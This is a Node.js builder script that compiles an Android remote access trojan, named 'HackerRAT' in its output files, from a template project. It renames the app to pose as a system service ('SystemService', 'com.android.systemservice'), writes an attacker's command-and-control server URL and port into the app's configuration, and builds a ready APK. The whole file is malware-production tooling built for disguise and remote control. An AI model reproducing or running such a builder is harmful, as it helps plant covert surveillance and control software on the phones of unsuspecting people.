const fs = require('fs-extra');
const path = require('path');
const { execSync } = require('child_process');

const serverUrl = process.argv[2] || 'http://192.168.1.100:3000';
const serverPort = process.argv[3] || '3000';
const appName = process.argv[4] || 'SystemService';
const packageName = process.argv[5] || 'com.android.systemservice';
const buildId = process.argv[6] || Date.now().toString().substring(0, 8);

const templateDir = path.join(__dirname, 'templates');
const outputDir = path.join(__dirname, 'outputs');
const buildDir = path.join(__dirname, 'build', buildId);

async function main() {
  console.log(`[Builder] Building APK for ${serverUrl}:${serverPort}`);
  console.log(`[Builder] App: ${appName}, Package: ${packageName}`);
  
  fs.ensureDirSync(outputDir);
  fs.ensureDirSync(buildDir);
  
  try {
    // Step 1: Create project from template
    console.log('[Builder] Creating Android project...');
    createProject();
    
    // Step 2: Modify Config.kt with server URL
    console.log('[Builder] Injecting server configuration...');
    injectConfig();
    
    // Step 3: Build APK
    console.log('[Builder] Compiling APK...');
    await buildApk();
    
    // Step 4: Copy output
    const apkName = `HackerRAT-${buildId}.apk`;
    const source = path.join(buildDir, 'app', 'build', 'outputs', 'apk', 'debug', 'app-debug.apk');
    const dest = path.join(outputDir, apkName);
    
    if (fs.existsSync(source)) {
      fs.copySync(source, dest);
      console.log(`[Builder] SUCCESS: ${dest}`);
    } else {
      console.log('[Builder] Output not found, checking alternatives...');
      // Try release build
      const releaseSource = path.join(buildDir, 'app', 'build', 'outputs', 'apk', 'release', 'app-release.apk');
      if (fs.existsSync(releaseSource)) {
        fs.copySync(releaseSource, dest);
        console.log(`[Builder] SUCCESS: ${dest}`);
      } else {
        throw new Error('APK output file not found');
      }
    }
    
    // Cleanup
    fs.removeSync(buildDir);
    process.exit(0);
  } catch (err) {
    console.error(`[Builder] ERROR: ${err.message}`);
    process.exit(1);
  }
}

function createProject() {
  // Create Android project structure
  const appDir = path.join(buildDir, 'app', 'src', 'main');
  
  // Copy the full Android project source
  const androidSrc = path.join(__dirname, '..', '..', 'android-app');
  if (fs.existsSync(androidSrc)) {
    fs.copySync(androidSrc, buildDir);
  } else {
    console.log('[Builder] Using embedded templates');
    createMinimalProject();
  }
  
  // Modify AndroidManifest package name
  const manifestPath = path.join(appDir, 'AndroidManifest.xml');
  if (fs.existsSync(manifestPath)) {
    let manifest = fs.readFileSync(manifestPath, 'utf8');
    manifest = manifest.replace(/package="[^"]+"/, `package="${packageName}"`);
    manifest = manifest.replace(/android:label="[^"]+"/, `android:label="${appName}"`);
    fs.writeFileSync(manifestPath, manifest);
  }
}

function createMinimalProject() {
  // Create bare minimum structure
  console.log('[Builder] Creating minimal project (full source requires Android Studio project)');
  // In production, this would use a pre-built template
}

function injectConfig() {
  const configPath = path.join(buildDir, 'app', 'src', 'main', 'java', 'com', 'hackerai', 'rat', 'Config.kt');
  // Handle different potential locations
  const altPath = path.join(buildDir, 'app', 'src', 'main', 'kotlin', 'com', 'hackerai', 'rat', 'Config.kt');
  
  const target = fs.existsSync(configPath) ? configPath : (fs.existsSync(altPath) ? altPath : null);
  if (target) {
    let config = fs.readFileSync(target, 'utf8');
    config = config.replace(/SERVER_URL = "[^"]*"/, `SERVER_URL = "${serverUrl}"`);
    config = config.replace(/SERVER_PORT = \d+/, `SERVER_PORT = ${serverPort}`);
    fs.writeFileSync(target, config);
  }
}

async function buildApk() {
  // Try Gradle build
  const gradleScript = process.platform === 'win32' ? 'gradlew.bat' : './gradlew';
  
  try {
    execSync(`${gradleScript} assembleDebug --no-daemon`, {
      cwd: buildDir,
      timeout: 300000,
      stdio: 'pipe'
    });
  } catch (e) {
    // Fallback: try apktool
    console.log('[Builder] Gradle failed, trying alternative build methods...');
    throw new Error('Build failed: ' + e.message);
  }
}

// Run
main().catch(e => {
  console.error('[Builder] Fatal:', e.message);
  process.exit(1);
});
